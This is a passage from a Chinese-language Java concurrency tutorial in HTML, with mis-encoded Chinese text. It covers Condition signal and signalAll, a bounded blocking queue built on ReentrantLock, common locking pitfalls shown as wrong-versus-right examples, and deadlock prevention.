        LockSupport.unpark(node.thread);  <span class="hljs-comment">// å‰é©±å–æ¶ˆæˆ–CASå¤±è´¥ï¼Œç›´æ¥å”¤é†’</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}
</code></pre>
<h4 data-id="heading-134">6.4 signalæµç¨‹å›¾</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9dce017eff344d35b70ee75e11adf654~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=BZE6wvikS2yGDgex7H1jx9bnooc%3D" alt="signal-flow.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-135">6.5 signalAll - å”¤é†’æ‰€æœ‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">signalAll</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (!isHeldExclusively())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
    
    <span class="hljs-type">Node</span> <span class="hljs-variable">first</span> <span class="hljs-operator">=</span> firstWaiter;
    <span class="hljs-keyword">if</span> (first != <span class="hljs-literal">null</span>)
        doSignalAll(first);
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSignalAll</span><span class="hljs-params">(Node first)</span> {
    <span class="hljs-comment">// æ¸…ç©ºæ¡ä»¶é˜Ÿåˆ—</span>
    lastWaiter = firstWaiter = <span class="hljs-literal">null</span>;
    
    <span class="hljs-comment">// é€ä¸ªè½¬ç§»æ‰€æœ‰èŠ‚ç‚¹</span>
    <span class="hljs-keyword">do</span> {
        <span class="hljs-type">Node</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> first.nextWaiter;
        first.nextWaiter = <span class="hljs-literal">null</span>;
        transferForSignal(first);
        first = next;
    } <span class="hljs-keyword">while</span> (first != <span class="hljs-literal">null</span>);
}
</code></pre>
<hr/>
<h3 data-id="heading-136">7. æœ‰ç•Œé˜»å¡é˜Ÿåˆ—</h3>
<h4 data-id="heading-137">7.1 è®¾è®¡æ€è·¯</h4>
<p>ä½¿ç”¨ä¸¤ä¸ªConditionå®ç°ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å¼ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f8d93f037ca49aaaf36bd585918b6e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=6cFdE3TMN8Q5Ct67eYEhYaUzRTk%3D" alt="bounded-queue-design.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-138">7.2 å®Œæ•´å®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * åŸºäºReentrantLockå’ŒConditionçš„æœ‰ç•Œé˜»å¡é˜Ÿåˆ—
 * <span class="hljs-doctag">@param</span> &lt;E&gt; å…ƒç´ ç±»å‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BoundedBlockingQueue</span>&lt;E&gt; {
    
    <span class="hljs-comment">/** åº•å±‚å­˜å‚¨ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object[] items;
    
    <span class="hljs-comment">/** é˜Ÿåˆ—å®¹é‡ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> capacity;
    
    <span class="hljs-comment">/** å½“å‰å…ƒç´ æ•°é‡ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> count;
    
    <span class="hljs-comment">/** ä¸‹ä¸€ä¸ªputçš„ä½ç½® */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> putIndex;
    
    <span class="hljs-comment">/** ä¸‹ä¸€ä¸ªtakeçš„ä½ç½® */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> takeIndex;
    
    <span class="hljs-comment">/** ä¸»é” */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ReentrantLock lock;
    
    <span class="hljs-comment">/** éç©ºæ¡ä»¶ï¼šæ¶ˆè´¹è€…ç­‰å¾… */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Condition notEmpty;
    
    <span class="hljs-comment">/** éæ»¡æ¡ä»¶ï¼šç”Ÿäº§è€…ç­‰å¾… */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Condition notFull;
    
    <span class="hljs-comment">/**
     * æ„é€ æ–¹æ³•
     * <span class="hljs-doctag">@param</span> capacity é˜Ÿåˆ—å®¹é‡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BoundedBlockingQueue</span><span class="hljs-params">(<span class="hljs-type">int</span> capacity)</span> {
        <span class="hljs-keyword">if</span> (capacity &lt;= <span class="hljs-number">0</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>();
        
        <span class="hljs-built_in">this</span>.capacity = capacity;
        <span class="hljs-built_in">this</span>.items = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[capacity];
        <span class="hljs-built_in">this</span>.lock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
        <span class="hljs-built_in">this</span>.notEmpty = lock.newCondition();
        <span class="hljs-built_in">this</span>.notFull = lock.newCondition();
    }
    
    <span class="hljs-comment">/**
     * æ”¾å…¥å…ƒç´ ï¼ˆé˜»å¡ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(E element)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-keyword">if</span> (element == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();
        
        lock.lockInterruptibly();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// é˜Ÿåˆ—æ»¡æ—¶ï¼Œç­‰å¾…notFullæ¡ä»¶</span>
            <span class="hljs-keyword">while</span> (count == capacity) {
                notFull.await();
            }
            
            <span class="hljs-comment">// æ”¾å…¥å…ƒç´ </span>
            enqueue(element);
            
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * å–å‡ºå…ƒç´ ï¼ˆé˜»å¡ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> E <span class="hljs-title function_">take</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        lock.lockInterruptibly();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// é˜Ÿåˆ—ç©ºæ—¶ï¼Œç­‰å¾…notEmptyæ¡ä»¶</span>
            <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>) {
                notEmpty.await();
            }
            
            <span class="hljs-comment">// å–å‡ºå…ƒç´ </span>
            <span class="hljs-keyword">return</span> dequeue();
            
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * æ”¾å…¥å…ƒç´ ï¼ˆè¶…æ—¶ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">offer</span><span class="hljs-params">(E element, <span class="hljs-type">long</span> timeout, TimeUnit unit)</span> 
            <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-keyword">if</span> (element == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();
        
        <span class="hljs-type">long</span> <span class="hljs-variable">nanos</span> <span class="hljs-operator">=</span> unit.toNanos(timeout);
        
        lock.lockInterruptibly();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">while</span> (count == capacity) {
                <span class="hljs-keyword">if</span> (nanos &lt;= <span class="hljs-number">0</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
                nanos = notFull.awaitNanos(nanos);
            }
            
            enqueue(element);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * å–å‡ºå…ƒç´ ï¼ˆè¶…æ—¶ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> E <span class="hljs-title function_">poll</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">long</span> <span class="hljs-variable">nanos</span> <span class="hljs-operator">=</span> unit.toNanos(timeout);
        
        lock.lockInterruptibly();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">if</span> (nanos &lt;= <span class="hljs-number">0</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
                nanos = notEmpty.awaitNanos(nanos);
            }
            
            <span class="hljs-keyword">return</span> dequeue();
            
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * å…¥é˜Ÿï¼ˆå†…éƒ¨æ–¹æ³•ï¼‰
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">enqueue</span><span class="hljs-params">(E element)</span> {
        items[putIndex] = element;
        <span class="hljs-keyword">if</span> (++putIndex == capacity)
            putIndex = <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¾ªç¯æ•°ç»„</span>
        count++;
        
        notEmpty.signal();  <span class="hljs-comment">// é€šçŸ¥æ¶ˆè´¹è€…</span>
    }
    
    <span class="hljs-comment">/**
     * å‡ºé˜Ÿï¼ˆå†…éƒ¨æ–¹æ³•ï¼‰
     */</span>
    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">private</span> E <span class="hljs-title function_">dequeue</span><span class="hljs-params">()</span> {
        <span class="hljs-type">E</span> <span class="hljs-variable">element</span> <span class="hljs-operator">=</span> (E) items[takeIndex];
        items[takeIndex] = <span class="hljs-literal">null</span>;  <span class="hljs-comment">// help GC</span>
        <span class="hljs-keyword">if</span> (++takeIndex == capacity)
            takeIndex = <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¾ªç¯æ•°ç»„</span>
        count--;
        
        notFull.signal();  <span class="hljs-comment">// é€šçŸ¥ç”Ÿäº§è€…</span>
        <span class="hljs-keyword">return</span> element;
    }
    
    <span class="hljs-comment">/**
     * è·å–å½“å‰å…ƒç´ æ•°é‡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> count;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isEmpty</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> size() == <span class="hljs-number">0</span>;
    }
    
    <span class="hljs-comment">/**
     * åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦å·²æ»¡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isFull</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> size() == capacity;
    }
}
</code></pre>
<h4 data-id="heading-139">7.3 ä½¿ç”¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BlockingQueueDemo</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        BoundedBlockingQueue&lt;Integer&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BoundedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">5</span>);
        
        <span class="hljs-comment">// ç”Ÿäº§è€…çº¿ç¨‹</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
                    queue.put(i);
                    System.out.println(<span class="hljs-string">"ç”Ÿäº§: "</span> + i + <span class="hljs-string">", é˜Ÿåˆ—å¤§å°: "</span> + queue.size());
                    Thread.sleep(<span class="hljs-number">100</span>);
                }
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }, <span class="hljs-string">"Producer"</span>);
        
        <span class="hljs-comment">// æ¶ˆè´¹è€…çº¿ç¨‹</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
                    <span class="hljs-type">Integer</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> queue.take();
                    System.out.println(<span class="hljs-string">"æ¶ˆè´¹: "</span> + item + <span class="hljs-string">", é˜Ÿåˆ—å¤§å°: "</span> + queue.size());
                    Thread.sleep(<span class="hljs-number">200</span>);  <span class="hljs-comment">// æ¶ˆè´¹æ…¢äºç”Ÿäº§</span>
                }
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }, <span class="hljs-string">"Consumer"</span>);
        
        producer.start();
        consumer.start();
    }
}
</code></pre>
<h4 data-id="heading-140">7.4 ä¸ArrayBlockingQueueå¯¹æ¯”</h4>
<p>æˆ‘ä»¬å®ç°çš„<code>BoundedBlockingQueue</code>ä¸JDKçš„<code>ArrayBlockingQueue</code>è®¾è®¡æ€è·¯ä¸€è‡´ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ArrayBlockingQueueæºç ï¼ˆç®€åŒ–ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;E&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueue</span>&lt;E&gt;
        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BlockingQueue</span>&lt;E&gt;, java.io.Serializable {
    
    <span class="hljs-keyword">final</span> Object[] items;
    <span class="hljs-type">int</span> takeIndex;
    <span class="hljs-type">int</span> putIndex;
    <span class="hljs-type">int</span> count;
    
    <span class="hljs-keyword">final</span> ReentrantLock lock;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Condition notEmpty;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Condition notFull;
    
    <span class="hljs-comment">// å®ç°ä¸æˆ‘ä»¬çš„å‡ ä¹ç›¸åŒ...</span>
}
</code></pre>
<h2 data-id="heading-141">ç¬¬äº”ç« ï¼šReentrantLock å®è·µ</h2>
<h3 data-id="heading-142">1. å¸¸è§é™·é˜±ä¸è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-143">1.1 é™·é˜±ä¸€ï¼šå¿˜è®°é‡Šæ”¾é”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”™è¯¯ï¼šæ²¡æœ‰åœ¨finallyä¸­é‡Šæ”¾é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dangerous</span><span class="hljs-params">()</span> {
    lock.lock();
    doSomething();  <span class="hljs-comment">// å¦‚æœè¿™é‡ŒæŠ›å¼‚å¸¸ï¼Œé”æ°¸è¿œä¸ä¼šé‡Šæ”¾ï¼</span>
    lock.unlock();
}

<span class="hljs-comment">/**
 * æ­£ç¡®ï¼šä½¿ç”¨try-finally
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">safe</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        doSomething();
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<h4 data-id="heading-144">1.2 é™·é˜±äºŒï¼šlock()æ”¾åœ¨tryå—å†…</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”™è¯¯ï¼šlock()åœ¨tryå†…éƒ¨
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">wrongPosition</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">try</span> {
        lock.lock();  <span class="hljs-comment">// å¦‚æœlock()ä¹‹å‰å°±æŠ›å¼‚å¸¸ï¼Œfinallyä¼šè°ƒç”¨unlock()</span>
        doSomething();
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();  <span class="hljs-comment">// å¯èƒ½æŠ›å‡ºIllegalMonitorStateException</span>
    }
}

<span class="hljs-comment">/**
 * æ­£ç¡®ï¼šlock()åœ¨tryä¹‹å‰
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">correctPosition</span><span class="hljs-params">()</span> {
    lock.lock();  <span class="hljs-comment">// lock()åœ¨tryä¹‹å‰</span>
    <span class="hljs-keyword">try</span> {
        doSomething();
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<h4 data-id="heading-145">1.3 é™·é˜±ä¸‰ï¼šé‡å…¥æ¬¡æ•°ä¸åŒ¹é…</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”™è¯¯ï¼šlockå’Œunlockæ¬¡æ•°ä¸åŒ¹é…
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">mismatch</span><span class="hljs-params">()</span> {
    lock.lock();
    lock.lock();  <span class="hljs-comment">// é‡å…¥ï¼Œstate = 2</span>
    <span class="hljs-keyword">try</span> {
        doSomething();
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();  <span class="hljs-comment">// åªé‡Šæ”¾ä¸€æ¬¡ï¼Œstate = 1ï¼Œé”æœªå®Œå…¨é‡Šæ”¾ï¼</span>
    }
}

<span class="hljs-comment">/**
 * æ­£ç¡®ï¼šæ¯æ¬¡lockéƒ½å¯¹åº”ä¸€æ¬¡unlock
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">match</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            doSomething();
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<h4 data-id="heading-146">1.4 é™·é˜±å››ï¼šCondition.await()ç”¨ifè€Œéwhile</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”™è¯¯ï¼šä½¿ç”¨ifæ£€æŸ¥æ¡ä»¶
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">wrongAwait</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">if</span> (!ready) {  <span class="hljs-comment">// å¯èƒ½è™šå‡å”¤é†’</span>
            condition.await();
        }
        <span class="hljs-comment">// readyå¯èƒ½ä»ä¸ºfalseï¼</span>
        process();
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}

<span class="hljs-comment">/**
 * æ­£ç¡®ï¼šä½¿ç”¨whileå¾ªç¯
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">correctAwait</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">while</span> (!ready) {  <span class="hljs-comment">// å¾ªç¯æ£€æŸ¥</span>
            condition.await();
        }
        <span class="hljs-comment">// readyä¸€å®šä¸ºtrue</span>
        process();
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<p><strong>è™šå‡å”¤é†’ï¼ˆSpurious Wakeupï¼‰</strong>ï¼šçº¿ç¨‹å¯èƒ½åœ¨æ²¡æœ‰è¢«signal()çš„æƒ…å†µä¸‹é†’æ¥ï¼Œå¿…é¡»ç”¨whileå¾ªç¯é‡æ–°æ£€æŸ¥æ¡ä»¶ã€‚</p>
<h4 data-id="heading-147">1.5 é™·é˜±äº”ï¼šåœ¨é”™è¯¯çš„çº¿ç¨‹è°ƒç”¨signal</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”™è¯¯ï¼šä¸æŒæœ‰é”æ—¶è°ƒç”¨signal
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">wrongSignal</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// æ²¡æœ‰è·å–é”</span>
    condition.signal();  <span class="hljs-comment">// æŠ›å‡ºIllegalMonitorStateException</span>
}

<span class="hljs-comment">/**
 * æ­£ç¡®ï¼šå¿…é¡»åœ¨æŒæœ‰é”æ—¶è°ƒç”¨
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">correctSignal</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        condition.signal();
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<h4 data-id="heading-148">1.6 é™·é˜±å…­ï¼štryLockè¿”å›å€¼æœªæ£€æŸ¥</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”™è¯¯ï¼šå¿½ç•¥tryLockè¿”å›å€¼
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ignoreTryLock</span><span class="hljs-params">()</span> {
    lock.tryLock();  <span class="hljs-comment">// è¿”å›å€¼è¢«å¿½ç•¥</span>
    <span class="hljs-keyword">try</span> {
        doSomething();  <span class="hljs-comment">// å¯èƒ½æ²¡æœ‰æŒæœ‰é”ï¼</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();  <span class="hljs-comment">// å¯èƒ½æŠ›å‡ºIllegalMonitorStateException</span>
    }
}

<span class="hljs-comment">/**
 * æ­£ç¡®ï¼šæ£€æŸ¥è¿”å›å€¼
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkTryLock</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (lock.tryLock()) {
        <span class="hljs-keyword">try</span> {
            doSomething();
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-149">2. æ­»é”é¢„é˜²ä¸æ£€æµ‹</h3>
<h4 data-id="heading-150">2.1 æ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cac757236674e0ebd0f15437e99499e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=gD0yJV%2FypZmsJR6tHOw8uqCyNA8%3D" alt="deadlock-conditions.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-151">2.2 æ­»é”ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å…¸å‹æ­»é”åœºæ™¯
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadlockDemo</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lockA</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lockB</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">// çº¿ç¨‹1æ‰§è¡Œ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
        lockA.lock();
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">100</span>);  <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶</span>
            lockB.lock();  <span class="hljs-comment">// ç­‰å¾…lockB</span>
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// ...</span>
            } <span class="hljs-keyword">finally</span> {
                lockB.unlock();
            }
        } <span class="hljs-keyword">finally</span> {
            lockA.unlock();
        }
    }
    
    <span class="hljs-comment">// çº¿ç¨‹2æ‰§è¡Œ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
        lockB.lock();
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">100</span>);  <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶</span>
            lockA.lock();  <span class="hljs-comment">// ç­‰å¾…lockAï¼Œå½¢æˆæ­»é”ï¼</span>
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// ...</span>
            } <span class="hljs-keyword">finally</span> {
                lockA.unlock();
            }
        } <span class="hljs-keyword">finally</span> {
            lockB.unlock();
        }
    }
}
</code></pre>
<h4 data-id="heading-152">2.3 æ­»é”é¢„é˜²ç­–ç•¥</h4>
<p>é¿å…æ­»é”æˆ‘é€šå¸¸ä¼šä»â€œä¸‰æ¿æ–§â€å…¥æ‰‹ï¼š<strong>ç»Ÿä¸€åŠ é”é¡ºåºã€åŠæ—¶é‡Šæ”¾é”ã€é…åˆè¶…æ—¶/ä¸­æ–­æœºåˆ¶</strong>ã€‚é¦–å…ˆï¼Œå¤šæŠŠé”åŒæ—¶ä½¿ç”¨æ—¶åº”è¯¥çº¦å®šå…¨å±€çš„åŠ é”é¡ºåºï¼Œæ¯”å¦‚æ€»æ˜¯å…ˆé” A å†é” Bï¼Œæ‰€æœ‰ä»£ç éƒ½éµå®ˆè¿™ä¸ªæ¬¡åºï¼Œä»æ ¹æºä¸Šç ´åæ­»é”çš„â€œå¾ªç¯ç­‰å¾…â€æ¡ä»¶ã€‚å…¶æ¬¡ï¼ŒåŠ¡å¿…ç”¨ <code>try { â€¦ } finally { lock.unlock(); }</code> ä¿è¯é”ä¸€å®šè¢«é‡Šæ”¾ï¼Œé¿å…å¼‚å¸¸å¯¼è‡´é”æ°¸è¿œä¸è§£ã€‚å†è€…ï¼Œåœ¨ä¸€äº›å¤æ‚åœºæ™¯ä¸‹ï¼Œæˆ‘ä¼šä½¿ç”¨ <code>tryLock(long timeout, TimeUnit unit)</code> æˆ– <code>lockInterruptibly()</code>ï¼šæ‹¿ä¸åˆ°é”æ—¶å¯ä»¥è¶…æ—¶é€€å‡ºæˆ–è€…å“åº”ä¸­æ–­ï¼Œä»è€Œâ€œè‡ªæ•‘â€ï¼Œè€Œä¸æ˜¯æ— é™æœŸç­‰å¾…ã€‚æ­¤å¤–ï¼Œçº¿ä¸Šæ’æŸ¥æ—¶å¯ä»¥ç»“åˆ <code>jstack</code> æˆ– <code>ThreadMXBean</code> çš„æ£€æµ‹æ–¹æ³•å»å‘ç°å’Œå®šä½æ½œåœ¨æ­»é”ã€‚</p>
<p><strong>ç­–ç•¥ä¸€ï¼šå›ºå®šåŠ é”é¡ºåº</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æŒ‰å›ºå®šé¡ºåºè·å–é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FixedOrder</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lockA</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lockB</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
